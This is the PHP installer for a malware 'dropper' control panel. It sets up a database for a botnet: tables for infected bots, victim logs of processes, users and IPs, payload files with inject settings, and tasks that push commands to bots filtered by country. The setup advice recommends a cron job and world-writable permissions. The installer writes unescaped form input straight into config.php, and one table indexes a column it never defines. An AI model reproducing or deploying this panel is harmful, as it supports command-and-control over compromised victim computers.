<?php

require_once('common.php');
$success = false;
if (is_readable('config.php')) 
{
    echo "config.php already exists delete it first!";
    exit();
}

if (isset($_POST['install']))
{
	$dbUser = $_POST['user'];
	$dbPass = $_POST['pass'];
	$dbHost = $_POST['host'];
	$dbName = $_POST['name'];
	$user = $_POST['admin_login'];
	$md5pass = md5($_POST['admin_pass']);
	if(empty($dbUser) || empty($dbPass) || empty($dbHost) || empty($dbName) || empty($user) || empty($md5pass))
	{
		$success = false;
	}
	else
	{
		define('MYSQL_HOST', $dbHost);
		define('MYSQL_LOGIN', $dbUser);
		define('MYSQL_PASSWORD', $dbPass);
		define('MYSQL_DB', $dbName);

		define('USER', $user);
		define('PASS', $md5pass);

		define('MYSQL_DEBUG', true);
		define('TIME_DEBUG', true);

		CreateDatabase();
		CreateConfigFile();
		
		$success = true;
	
	}
}

function CreateConfigFile()
{
	global $dbUser, $dbPass, $dbHost, $dbName, $user, $md5pass;
	
$config = <<<DATA
<?php

define('MYSQL_HOST', '$dbHost');
define('MYSQL_LOGIN', '$dbUser');
define('MYSQL_PASSWORD', '$dbPass');
define('MYSQL_DB', '$dbName');

define('USER', '$user');
define('PASS', '$md5pass');

//define('DEBUG', true);
//define('MYSQL_DEBUG', true);
//define('TIME_DEBUG', true);

DATA;
        
	$fh = @fopen('config.php', 'wb');
    if (false === $fh) 
    {
    	echo "Can't create config.php. Create it manually with next content:\n<hr><pre>";
    	echo htmlspecialchars($config);
    	flush();
    	exit();
    }

    fwrite($fh, $config);
}

function CreateDatabase()
{
    error_reporting(0);

    Db_Mysql::init(MYSQL_HOST, MYSQL_LOGIN, MYSQL_PASSWORD, MYSQL_DB);

    $db = Db_Mysql::getInstance();
    $db -> query('SET NAMES "utf8" COLLATE "utf8_unicode_ci";');
    $db -> debug = 0;

    //--------------------------------------------------------------------------------------------------------
    
    $db -> query('DROP TABLE IF EXISTS `bots`;');
	if (!$db -> query
    ("
        CREATE TABLE IF NOT EXISTS `bots` (
		  `botId` int(11) unsigned NOT NULL AUTO_INCREMENT,
		  `botName` char(128) NOT NULL,
		  `botIp` bigint(20) NOT NULL,
		  `botVersion` int(11) unsigned NOT NULL,
		  `botAdded` int(11) unsigned NOT NULL,
		  `botAccess` int(11) unsigned NOT NULL,
		  `botCountry` varchar(2) NOT NULL default '??',
		  `botOS` tinyblob NOT NULL,
		  `botBuildId` char(30) NOT NULL,
		  `botClean` enum('yes','no') NOT NULL default 'yes',
          PRIMARY KEY (`botId`),
          UNIQUE KEY `botName` (`botName`),
          KEY `botAdded` (`botAdded`),
          KEY `botAccess` (`botAccess`),
          KEY `botCountry` (`botCountry`),
          KEY `botSystem` (`botSystem`),
          KEY `botBuildId` (`botBuildId`)
        ) ENGINE=InnoDB DEFAULT CHARACTER SET utf8;
    "))
    {
        exit;
    }

    //--------------------------------------------------------------------------------------------------------

    $db -> query('DROP TABLE IF EXISTS `daily`;');
    if (!$db -> query
    ("
        CREATE TABLE IF NOT EXISTS `daily` (
		  `dayBuildId` char(30) NOT NULL,
		  `dayDate` DATE NOT NULL,
		  `dayBots` int(11) DEFAULT NULL,
		  `dayBotsNew` int(11) DEFAULT NULL,
		  `dayBotsDead` int(11) DEFAULT NULL,
		  `dayBotsOnline` int(11) DEFAULT NULL,
		  `dayBotsMaxOnline` int(11) DEFAULT NULL,
		  `dayBotsMinOnline` int(11) DEFAULT NULL,
		  `dayBotsLifeTime` float(11) DEFAULT NULL,
		  `dayBotsNetTime` float(11) DEFAULT NULL,
		  KEY `dayIndex` (`dayDate`, `dayBuildId`),
		  KEY `dayBotsMaxOnline` (`dayBotsMaxOnline`),
          KEY `dayBotsMinOnline` (`dayBotsMinOnline`)
        ) ENGINE=InnoDB DEFAULT CHARACTER SET utf8;
    "))
    {
        exit;
    }

    //--------------------------------------------------------------------------------------------------------

    $db -> query('DROP TABLE IF EXISTS `stats`;');
    if (!$db -> query
    ("
        CREATE TABLE IF NOT EXISTS `stats` (
          `statBuildId` char(30) NOT NULL,
		  `statCountry` varchar(10) NOT NULL default '',
		  `statSystem` char(30) NOT NULL,
		  `statBots` int(11) DEFAULT NULL,
		  `statBotsDead` int(11) DEFAULT NULL,
		  `statBotsOnline` int(11) DEFAULT NULL,
		  `statBotsLifeTime` float(11) DEFAULT NULL,
		  `statBotsNetTime` float(11) DEFAULT NULL,
		  KEY `statIndex` (`statCountry`, `statSystem`, `statBuildId`)
        ) ENGINE=InnoDB DEFAULT CHARACTER SET utf8;
    "))
    {
        exit;
    }
	
	//--------------------------------------------------------------------------------------------------------

	$db -> query('DROP TABLE IF EXISTS `botnet_logs`;');
	if (!$db -> query
		("
        CREATE TABLE IF NOT EXISTS `botnet_logs` (
		  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
		  `bot_id` char(100) NOT NULL default '??',
		  `botnet` char(30) NOT NULL,
		  `bot_version` int(10) unsigned NOT NULL,
		  `bot_country` varchar(2) NOT NULL default '??',
		  `path` TEXT NOT NULL default '??',
		  `time_system` int(10) NOT NULL,
		  `time_tick` int(11) NOT NULL,
		  `time_localbias` int(11) NOT NULL,
		  `log_time` int(11) NOT NULL,
		  `os_version` tinyblob NOT NULL,
		  `language_id` smallint(5) NOT NULL,
		  `process_name` text NOT NULL,
		  `process_user` text NOT NULL,
		  `type` int(10) NOT NULL,
		  `context` longtext NOT NULL,
		  `ip` varbinary(15) NOT NULL default '0.0.0.0',
          PRIMARY KEY (`id`)
        ) ENGINE=InnoDB DEFAULT CHARACTER SET utf8;
    "))
	{
		exit;
	}
    
    //--------------------------------------------------------------------------------------------------------

	$db -> query('DROP TABLE IF EXISTS `debug`;');
	if (!$db -> query
    ("
        CREATE TABLE IF NOT EXISTS `debug` (
		  `logId` int(11) unsigned NOT NULL AUTO_INCREMENT,
		  `logType` int(10) unsigned NOT NULL,
		  `logBotName` char(100) NOT NULL,
		  `logAdded` int(11) unsigned NOT NULL,
		  `logFunctionNameHash` int(11) unsigned NOT NULL,
		  `logFormatHash` int(11) unsigned NOT NULL,
		  `logText` TEXT NOT NULL,
          PRIMARY KEY (`logId`),
          KEY `logBotName` (`logBotName`),
          KEY `logAdded` (`logAdded`)
        ) ENGINE=InnoDB DEFAULT CHARACTER SET utf8;
    "))
    {
        exit;
    }

    //--------------------------------------------------------------------------------------------------------

    $db -> query('DROP TABLE IF EXISTS `files`;');
    if (!$db -> query
    ("
        CREATE TABLE IF NOT EXISTS `files` (
          `fId` int(11) unsigned NOT NULL AUTO_INCREMENT,
		  `fArch` char(5) NOT NULL,
		  `fName` char(30) NOT NULL,
		  `fInject` char(30) NOT NULL,
		  `fVer` char(15) NOT NULL,
		  `fFilePath` text NOT NULL,
		  `fDate` datetime NOT NULL,
		  `fConnectedWith` char(30) NOT NULL,
		  `fArgs` char(200) NOT NULL default 'empty',
		  PRIMARY KEY (`fId`)
        ) ENGINE=InnoDB DEFAULT CHARACTER SET utf8;
    "))
    {
        exit;
    }

    //--------------------------------------------------------------------------------------------------------

    $db -> query('DROP TABLE IF EXISTS `country`;');
    if (!$db -> query
    ("
        CREATE TABLE IF NOT EXISTS `country` (
          `cId` int(11) NOT NULL auto_increment,
          `cName` varchar(200) NOT NULL default '',
          `cCountry1` set('AP','EU','AD','AE','AF','AG','AI','AL','AM','AN','AO','AQ','AR','AS','AT','AU','AW','AZ','BA','BB','BD','BE','BF','BG','BH','BI','BJ','BM','BN','BO','BR','BS','BT','BV','BW','BY','BZ','CA','CC','CD','CF','CG','CH','CI','CK','CL','CM','CN','CO','CR','CU','CV','CX','CY','CZ','DE','DJ','DK','DM','DO','DZ','EC','EE','EG') NOT NULL default '',
          `cCountry2` set('EH','ER','ES','ET','FI','FJ','FK','FM','FO','FR','FX','GA','GB','GD','GE','GF','GH','GI','GL','GM','GN','GP','GQ','GR','GS','GT','GU','GW','GY','HK','HM','HN','HR','HT','HU','ID','IE','IL','IN','IO','IQ','IR','IS','IT','JM','JO','JP','KE','KG','KH','KI','KM','KN','KP','KR','KW','KY','KZ','LA','LB','LC','LI','LK','LR') NOT NULL default '',
          `cCountry3` set('LS','LT','LU','LV','LY','MA','MC','MD','MG','MH','MK','ML','MM','MN','MO','MP','MQ','MR','MS','MT','MU','MV','MW','MX','MY','MZ','NA','NC','NE','NF','NG','NI','NL','NO','NP','NR','NU','NZ','OM','PA','PE','PF','PG','PH','PK','PL','PM','PN','PR','PS','PT','PW','PY','QA','RE','RO','RU','RW','SA','SB','SC','SD','SE','SG') NOT NULL default '',
          `cCountry4` set('SH','SI','SJ','SK','SL','SM','SN','SO','SR','ST','SV','SY','SZ','TC','TD','TF','TG','TH','TJ','TK','TM','TN','TO','TL','TR','TT','TV','TW','TZ','UA','UG','UM','US','UY','UZ','VA','VC','VE','VG','VI','VN','VU','WF','WS','YE','YT','RS','ZA','ZM','ME','ZW','A1','A2','O1','AX','GG','IM','JE','UNKNOWN') NOT NULL default '',
          PRIMARY KEY  (`cId`)
        ) ENGINE=InnoDB DEFAULT CHARACTER SET utf8;
        "))
    {
        exit;
    }
    $db->query("INSERT INTO `country` VALUES (1, 'IT', '', 'IT', '', '');");
    $db->query("INSERT INTO `country` VALUES (2, 'AU', 'AU', '', '', '');");
    $db->query("INSERT INTO `country` VALUES (3, 'ES', '', 'ES', '', '');");
    $db->query("INSERT INTO `country` VALUES (4, 'DE', 'DE', '', '', '');");
    $db->query("INSERT INTO `country` VALUES (5, 'GB', '', 'GB', '', '');");
    $db->query("INSERT INTO `country` VALUES (6, 'NZ', '', '', 'NZ', '');");
    $db->query("INSERT INTO `country` VALUES (7, 'US', '', '', '', 'US');");
    $db->query("INSERT INTO `country` VALUES (8, 'FR', '', 'FR', '', '');");
    $db->query("INSERT INTO `country` VALUES (9, 'PT', '', '', 'PT', '');");
    $db->query("INSERT INTO `country` VALUES (10, 'JP', '', 'JP', '', '');");
    $db->query("INSERT INTO `country` VALUES (11, 'CA', 'CA', '', '', '');");
    $db->query("INSERT INTO `country` VALUES (12, 'SE', '', '', 'SE', '');");
    $db->query("INSERT INTO `country` VALUES (13, 'BR', 'BR', '', '', '');");
    $db->query("INSERT INTO `country` VALUES (14, 'TR', '', '', '', 'TR');");
    $db->query("INSERT INTO `country` VALUES (15, 'NL', '', '', 'NL', '');");
    $db->query("INSERT INTO `country` VALUES (16, 'NO', '', '', 'NO', '');");
    $db->query("INSERT INTO `country` VALUES (17, 'GR', '', 'GR', '', '');");
    $db->query("INSERT INTO `country` VALUES (18, 'PL', '', '', 'PL', '');");
    $db->query("INSERT INTO `country` VALUES (19, 'RU', '', '', 'RU', '');");
    $db->query("INSERT INTO `country` VALUES (20, 'UA', '', '', '', 'UA');");
    $db->query("INSERT INTO `country` VALUES (21, 'CN', 'CN', '', '', '');");
    $db->query("INSERT INTO `country` VALUES (22, 'BY', 'BY', '', '', '');");
    $db->query("INSERT INTO `country` VALUES (23, 'KZ', '', 'KZ', '', '');");
    $db->query("INSERT INTO `country` VALUES (24, 'MIX', 'AP,EU,AD,AE,AF,AG,AI,AL,AM,AN,AO,AQ,AR,AS,AT,AW,AZ,BA,BB,BD,BE,BF,BG,BH,BI,BJ,BM,BN,BO,BS,BT,BV,BW,BZ,CC,CD,CF,CG,CH,CI,CK,CL,CM,CO,CR,CU,CV,CX,CY,CZ,DJ,DK,DM,DO,DZ,EC,EE,EG', 'EH,ER,ET,FI,FJ,FK,FM,FO,FX,GA,GD,GE,GF,GH,GI,GL,GM,GN,GP,GQ,GS,GT,GU,GW,GY,HK,HM,HN,HR,HT,HU,ID,IE,IL,IN,IO,IQ,IR,IS,JM,JO,KE,KG,KH,KI,KM,KN,KP,KR,KW,KY,LA,LB,LC,LI,LK,LR', 'LS,LT,LU,LV,LY,MA,MC,MD,MG,MH,MK,ML,MM,MN,MO,MP,MQ,MR,MS,MT,MU,MV,MW,MX,MY,MZ,NA,NC,NE,NF,NG,NI,NP,NR,NU,OM,PA,PE,PF,PG,PH,PK,PM,PN,PR,PS,PW,PY,QA,RE,RO,RW,SA,SB,SC,SD,SG', 'SH,SI,SJ,SK,SL,SM,SN,SO,SR,ST,SV,SY,SZ,TC,TD,TF,TG,TH,TJ,TK,TM,TN,TO,TL,TT,TV,TW,TZ,UG,UM,UY,UZ,VA,VC,VE,VG,VI,VN,VU,WF,WS,YE,YT,RS,ZA,ZM,ME,ZW,A1,A2,O1,AX,GG,IM,JE,UNKNOWN');");

    //--------------------------------------------------------------------------------------------------------

    $db -> query('DROP TABLE IF EXISTS `tasks`;');
    if (!$db -> query
    ("
        CREATE TABLE IF NOT EXISTS `tasks` (
            `tId` int(6) unsigned NOT NULL auto_increment,
            `tName` varchar(200) NOT NULL default '',
            `tPriority` int(6) unsigned NOT NULL default '0',
            `tBuild` varchar(200) NOT NULL default '',
			`tArch` varchar(5) NOT NULL,
            `tConfirm` enum('yes', 'no') NOT NULL default 'yes',
            `tOnlyForClean` enum('yes', 'no') NOT NULL default 'no',
            `tMarkAsDirty` enum('yes', 'no') NOT NULL default 'no',
            `tCount` int(11) NOT NULL default '0',
            `tState` enum('paused', 'running', 'finished', 'stopped') NOT NULL default 'paused',
            `tCommand` varchar(200) NOT NULL default '',
            `tViewCommand` varchar(200) NOT NULL default '',
            `tCountry1` set
            ('AP','EU','AD','AE','AF','AG','AI','AL','AM','AN','AO','AQ','AR','AS','AT','AU','AW','AZ','BA','BB','BD','BE','BF','BG','BH','BI','BJ','BM',
            'BN','BO','BR','BS','BT','BV','BW','BY','BZ','CA','CC','CD','CF','CG','CH','CI','CK','CL','CM','CN','CO','CR','CU','CV','CX','CY','CZ',
            'DE','DJ','DK','DM','DO','DZ','EC','EE','EG') NOT NULL default '',
            `tCountry2` set
            ('EH','ER','ES','ET','FI','FJ','FK','FM','FO','FR','FX','GA','GB','GD','GE','GF','GH','GI','GL','GM','GN','GP','GQ','GR','GS','GT','GU','GW',
            'GY','HK','HM','HN','HR','HT','HU','ID','IE','IL','IN','IO','IQ','IR','IS','IT','JM','JO','JP','KE','KG','KH','KI','KM','KN','KP','KR',
            'KW','KY','KZ','LA','LB','LC','LI','LK','LR') NOT NULL default '',
            `tCountry3` set
            ('LS','LT','LU','LV','LY','MA','MC','MD','MG','MH','MK','ML','MM','MN','MO','MP','MQ','MR','MS','MT','MU','MV','MW','MX','MY','MZ','NA','NC',
            'NE','NF','NG','NI','NL','NO','NP','NR','NU','NZ','OM','PA','PE','PF','PG','PH','PK','PL','PM','PN','PR','PS','PT','PW','PY','QA','RE',
            'RO','RU','RW','SA','SB','SC','SD','SE','SG') NOT NULL default '',
            `tCountry4` set
            ('SH','SI','SJ','SK','SL','SM','SN','SO','SR','ST','SV','SY','SZ','TC','TD','TF','TG','TH','TJ','TK','TM','TN','TO','TL','TR','TT','TV','TW',
            'TZ','UA','UG','UM','US','UY','UZ','VA','VC','VE','VG','VI','VN','VU','WF','WS','YE','YT','RS','ZA','ZM','ME','ZW','A1','A2','O1','AX',
            'GG','IM','JE','UNKNOWN') NOT NULL default '',
            `tStartedCount` int(11) NOT NULL default '0',
            `tFinishedCount` int(11) NOT NULL default '0',
            `tFailedCount` int(11) NOT NULL default '0',
			`tArchDifference` int(11) NOT NULL default '0',
            `tCreateTime` datetime NOT NULL default '0000-00-00 00:00:00',
            `tLastTime` datetime default NULL,
			`tOnlyThisBots` varchar(200) NOT NULL default '*',
			`tRunMode` int(4) NOT NULL default '2',
            PRIMARY KEY  (`tId`),
            KEY `tCountry1` (`tCountry1`),
            KEY `tCountry2` (`tCountry2`),
            KEY `tCountry3` (`tCountry3`),
            KEY `tCountry4` (`tCountry4`)
        ) ENGINE=InnoDB DEFAULT CHARACTER SET utf8
    "))
    {
        exit;
    }

    //--------------------------------------------------------------------------------------------------------

    $db -> query("DROP TABLE IF EXISTS `loads`;");
	if (!$db -> query
    ("
        CREATE TABLE IF NOT EXISTS `loads` (
			`lId` int(11) unsigned NOT NULL AUTO_INCREMENT,
		    `lTaskId` int(10) unsigned NOT NULL default '0',
		    `lBotId` int(10) unsigned NOT NULL default '0',
		    `lAnswer` varchar(100) default NULL,
		    `lCountry` varchar(10) NOT NULL default '',
		    `lStartTime` datetime NOT NULL default '0000-00-00 00:00:00',
            `lFinishTime` datetime default NULL,
		  PRIMARY KEY (`lId`),
		  KEY `lBotId` (`lBotId`),
          KEY `lTaskId` (`lTaskId`),
          KEY `lStartTime` (`lStartTime`),
          KEY `lFinishTime` (`lFinishTime`)
		) ENGINE=InnoDB DEFAULT CHARACTER SET utf8;
	"))
    {
        exit;
    }

    //--------------------------------------------------------------------------------------------------------

    $db -> query("DROP TABLE IF EXISTS `options`;");
	if (!$db -> query
    ("
        CREATE TABLE IF NOT EXISTS `options` (
			`name` varchar(64) NOT NULL default '',
			`data` text,
			PRIMARY KEY (`name`)
		) ENGINE=InnoDB DEFAULT CHARACTER SET utf8;
	"))
    {
        exit;
    }
    $db->query('INSERT INTO options VALUES("alive", "3");');
	$db->query('INSERT INTO options VALUES("delay", "10");');

    //--------------------------------------------------------------------------------------------------------

    $db -> close();
}

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Install</title>
<script type="text/javascript" src="js/jquery-1.6.4.min.js"></script>
<script type="text/javascript" src="js/formee.js"></script>
<link rel="stylesheet" href="css/formee-structure.css" type="text/css" media="screen" />
<link rel="stylesheet" href="css/formee-style.css" type="text/css" media="screen" />
<style type="text/css">
* {margin:0;padding:0;}
/* fix  ff bugs */
form:after, div:after, ol:after, ul:after, li:after, dl:after {
	content:".";
	display:block;
	clear:both;
	visibility:hidden;
	height:0;
	overflow:hidden;
}
body {background: #fff; font: normal 10px/1.1em Arial,Sans-Serif;margin:0;padding:0;}
form {clear:both;}
.container {margin:0 auto; height:100%;padding:0 40px;}
.footer, .footer a {color:#fff;}
.left {float:left;}
.right {float:right;}
.topbar {
	background: #fafafa;
	padding: 10px 30px;
  border-bottom:1px solid #e9e9e9;
}
.topbar a{
	color:#777;
	font-size:1.4em;
	text-decoration: none;
}
.topbar a:hover{
	color:#69a4d0;
	text-decoration: underline;
}

.link-to {
	font-size:2.4em;
	letter-spacing:-.02em;
	line-height:1em;
	color:#EA0076;
	float:right;
	margin-bottom:2em;
}
</style>

</head>

<body>
    	   
<div class="container">
    
	
    
    <div class="formee-msg-info">
    	<h3>Some Advices.</h3>
        <ul>
        	<li>[!] Don't forget to add cron job <strong><u>cd 'path_to_dropper/act' && /usr/bin/env php 'cron.php' cron</u></strong>, otherwise you should run it in browser (/act/cron.php) manually to update statistics.</li>
        	<li>[!] Do not forget to delete this file after installing</li>
			<li>[+] CHMOD dropper folder and all files/folder in it to 777</li>
        </ul>
    
    </div>
    
	
	
	<!-- formee-->
	<form class="formee" action="#" method='POST'>
	<?php 
	if (isset($_POST['install']))
	{
	echo '
	<fieldset>
    	<legend>Result</legend>
        ';
		if($success) {echo '<div class="formee-msg-success"><h3>Installation successfuly finished.</h3></div>';metaRefresh("index.php");}
		else echo '<div class="formee-msg-error"><h3>Please check installation data (login, pass, host) and make sure you can connect to your db.</h3></div>';

        echo '</fieldset>';
	}
	else
	{
	echo '
    <fieldset>
        <legend>Installation of dropper\'s panel</legend>
        <div class="grid-12-12">
                <label>DB Host <em class="formee-req">*</em></label>
               <input name="host" type="text" value="localhost" />
        </div>
		<div class="grid-12-12">
                <label>DB User <em class="formee-req">*</em></label>
               <input name="user" type="text" value="root" />
        </div>
		<div class="grid-12-12">
                <label>DB Pass <em class="formee-req">*</em></label>
               <input name="pass" type="text" value="" />
        </div>
		<div class="grid-12-12">
                <label>DB Name <em class="formee-req">*</em></label>
               <input name="name" type="text" value="dropper_db" />
        </div>
		<div class="grid-12-12">
                <label>Admin login <em class="formee-req">*</em></label>
               <input name="admin_login" type="text" value="admin" />
        </div>
		<div class="grid-12-12">
                <label>Admin password <em class="formee-req">*</em></label>
               <input name="admin_pass" type="text" value="" />
        </div>
        
        <div class="grid-12-12">
               <input class="left" type="submit" name=\'install\' title="Install" value="Install" />
        </div>
    </fieldset>
	</form>';
	}
    ?>
    

</div>

</body>
</html>
